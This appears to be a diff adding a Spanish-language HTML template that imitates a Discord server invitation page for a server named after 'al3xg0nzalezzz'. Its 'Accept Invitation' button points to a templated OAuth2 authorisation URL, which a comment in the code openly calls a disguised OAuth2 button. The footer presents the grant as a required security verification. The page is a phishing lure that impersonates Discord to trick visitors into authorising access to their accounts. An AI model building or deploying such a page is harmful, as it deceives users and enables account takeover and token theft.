@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord | Invitación</title>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-main: #313338;
+            --bg-card: #2b2d31;
+            --blurple: #5865f2;
+            --blurple-hover: #4752c4;
+            --text-muted: #b5bac1;
+            --text-header: #f2f3f5;
+            --text-normal: #dbdee1;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body { 
+            background-color: var(--bg-main); 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            font-family: 'Outfit', sans-serif; 
+            background-image: url('https://discord.com/assets/2c21aeda16de354ba533.png'); 
+            background-size: cover; 
+            color: white;
+        }
+
+        .card { 
+            background-color: var(--bg-card); 
+            width: 100%; 
+            max-width: 440px; 
+            padding: 32px; 
+            border-radius: 8px; 
+            box-shadow: 0 8px 16px rgba(0,0,0,0.3); 
+            text-align: center; 
+            animation: fadeIn 0.4s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .guild-icon { 
+            width: 80px; 
+            height: 80px; 
+            border-radius: 28px; 
+            margin-bottom: 20px; 
+            object-fit: cover; 
+            box-shadow: 0 4px 10px rgba(0,0,0,0.3); 
+        }
+
+        .invite-header { 
+            color: var(--text-muted); 
+            font-size: 12px; 
+            font-weight: 700; 
+            text-transform: uppercase; 
+            margin-bottom: 8px; 
+            letter-spacing: 0.5px; 
+        }
+
+        .guild-name { 
+            color: var(--text-header); 
+            font-size: 24px; 
+            font-weight: 600; 
+            margin-bottom: 25px; 
+        }
+
+        .btn-discord { 
+            background-color: var(--blurple); 
+            color: white; 
+            text-decoration: none; 
+            padding: 13px; 
+            border-radius: 3px; 
+            font-weight: 500; 
+            font-size: 16px; 
+            display: block; 
+            transition: 0.2s; 
+            margin-bottom: 15px;
+        }
+
+        .btn-discord:hover { 
+            background-color: var(--blurple-hover); 
+        }
+
+        .footer-txt { 
+            color: #949ba4; 
+            font-size: 12px; 
+            margin-top: 20px; 
+            line-height: 1.5; 
+        }
+        
+        .brand {
+            font-size: 10px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: #4e5058;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <img src="https://i.pinimg.com/736x/10/e3/f5/10e3f51d11ef13d5c88cb329211146ba.jpg" class="guild-icon">
+        <div class="invite-header">Has recibido una invitación para unirte a</div>
+        <div class="guild-name">Servidor de al3xg0nzalezzz</div>
+        
+        <!-- El botón de OAuth2 camuflado -->
+        <a href="{{ auth_url }}" class="btn-discord">Aceptar Invitación</a>
+        
+        <div class="footer-txt">
+            Al unirte, autorizas la verificación de seguridad necesaria para el acceso exclusivo al servidor.
+        </div>
+        
+        <div class="brand">al3xg0nzalezzz</div>
+    </div>
+</body>
+</html>
